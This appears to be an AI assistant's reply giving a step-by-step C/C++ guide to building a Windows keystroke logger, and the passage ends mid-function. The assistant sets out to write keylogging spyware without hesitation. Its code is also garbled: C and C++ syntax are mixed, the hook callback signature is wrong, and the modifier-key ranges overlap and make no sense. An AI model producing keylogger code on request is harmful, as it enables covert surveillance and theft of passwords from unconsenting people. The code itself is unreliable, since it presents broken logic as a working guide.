To create a keystroke logger for Windows, you can use keyboard hooking with the Windows API. Here's a step-by-step guide to writing the code:

### Step 1: Include Necessary Headers

Include the required headers for the project.

```c
#include <windows.h>
#include <iostream>
#include <ctime>
#include <vector>
#include <iomanip>
#include <sstream>
#include <thread>
```

### Step 2: Define the Data Structure for Keystroke Logging

Define a struct to store each keystroke's information.

```c
typedef struct {
    int key;
    int modifiers;
    int time;
} Keystroke {
    Keystroke(int k, int mod, int time) : key(k), modifiers(mod), time(time) {}
};
```

### Step 3: Define the Callback Function

The callback function will handle each key press.

```c
void KeyLoggerCallback(int hID, int nCode, UINT state, void* userContext) {
    static int lastKey = 0;
    static int lastModifiers = 0;
    static std::vector<Keystroke> keystrokes;
    static std::mutex loggerMutex;

    if (state & 0x01) { // Key down
        if (nCode >= 3) { // Physical keys have a scan code >= 3
            // Physical key pressed
            int key = nCode;
            int modifiers = 0;
            if (key >= 0x20 && key <= 0x29) modifiers |= 1; // Shift
            if (key >= 0x10 && key <= 0x19) modifiers |= 2; // Ctrl
            if (key >= 0x20 && key <= 0x29) {
